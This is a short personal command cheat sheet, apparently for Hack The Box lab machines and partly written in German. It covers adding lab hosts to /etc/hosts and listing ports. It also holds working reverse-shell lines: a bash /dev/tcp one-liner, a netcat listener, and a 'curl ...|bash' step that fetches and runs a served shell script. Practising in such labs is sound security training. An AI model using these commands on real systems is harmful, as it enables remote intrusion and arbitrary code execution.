## Shell
echo to host file
```sh
echo "10.129.152.215 unika.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.108.117 thetoppers.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.251.52 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.1.27 ignition.htb" | sudo tee -a /etc/hosts
```

liste aller offenen Ports

```sh
-l: Display only listening sockets.
-t: Display TCP sockets.
-n: Do not try to resolve service names.

ss -tln

```
```sh
sudo netstat -tulnp
```

open reverse shell

### Reverse shell Server
- Kali contains a share folder with shell scrips
```sh
#create a listener for shell session
nc -nvlp 1337

#!/bin/bash
bash -i >& /dev/tcp/10.10.15.71/1337 0>&1

python3 -m http.server 8000

```
### get own ip
```
ip a | grep tun0 

```
### pwd
```sh
pwd #print working directory
```
```sh
python -m http.server 8001
```

### Differences between files
```sh
diff -y file1 file2
-y # side by side
```

## CurlAShell
```bash
#Create shell.sh file
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/6565 0>&1'
#start python server
python3 -m http.server 8003
#start netcat listener
nc -lvnp 6565
#curl the shell
curl 10.10.14.190:8003/shell.sh|bash
```


